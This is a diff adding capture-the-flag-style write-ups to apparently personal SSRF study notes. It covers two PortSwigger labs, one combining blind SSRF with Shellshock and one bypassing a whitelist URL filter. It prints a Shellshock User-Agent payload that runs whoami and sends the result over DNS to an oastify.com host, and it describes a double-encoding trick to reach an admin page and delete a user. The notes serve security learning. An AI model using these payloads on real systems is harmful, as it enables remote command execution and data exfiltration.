@@ -345,3 +345,60 @@ Because the `Referer` header is fully attacker-controlled (a client can set it t
 Headers that seem purely informational (like `Referer`) can still be parsed and acted upon server-side. Any header value that might be fetched, resolved, or processed as a URL should be treated as SSRF attack surface, not just conventional request parameters.
 
 ---
+## Lab: Blind SSRF with shellshock exploitation:
+
+This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.
+
+To solve the lab, use this functionality to perform a blind SSRF attack against an internal server in the `192.168.0.X` range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user.
+
+Install Collaborator Everywhere burpsuite extension for easy finding of vulnerable SSRF parameter.
+
+When looking at the website the Collaborator Everywhere extension found two concerning things that are in the product view page.
+
+The first thing is Referer which indicate Blind SSRF and second is user agent which might be vulnerable to the ShellShock exploit.
+
+![[Pasted image 20260904093845.png]]
+
+We use a basic shellshock exploit to find the user and in the referer we use intruder to find the username.
+
+The shellshock exploit that was used is:
+
+```
+User-Agent: () { :; }; /usr/bin/nslookup $(whoami).oum8yyrum1ube4w2youh099m8de42uqj.oastify.com
+```
+
+Then acccording to the context given by the lab we knew that the internal server is in [http://192.168.0](http://192.168.0).{}:8080/ so we used the intruder to find out which internal sever ip is correct
+![[Pasted image 20260904093936.png]]
+
+![[Pasted image 20260904093956.png]]
+
+---
+## Lab: SSRF with whitelist-based input filter
+
+This lab has a stock check feature which fetches data from an internal system.
+
+To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.
+
+The developer has deployed an anti-SSRF defense you will need to bypass.
+
+The request we are looking for is the stock change request:
+
+![[Pasted image 20260904094100.png]]
+
+When the stockApi value is changed to anythink but [stock.weliketoshop.net](http://stock.weliketoshop.net/) it shows error. But when we give it username@stock.weliketoshop.net it said cant connect to stock service which showed it tried to parse username too. When we add # before @ it says the URL needs to stock.weliketoshop.net so we try encoding it and it worked while double encoding it.
+
+![[Pasted image 20260904094229.png]]
+
+So for admin we go to /admin
+
+![[Pasted image 20260904094304.png]]
+
+And while navigating through admin page we found /admin/delete?username=carlos
+
+![[Pasted image 20260904094342.png]]
+
+So this lab is solved.
+
+---
+Last two labs were in expert level of portswigger which meaned that they were a little difficult.
+
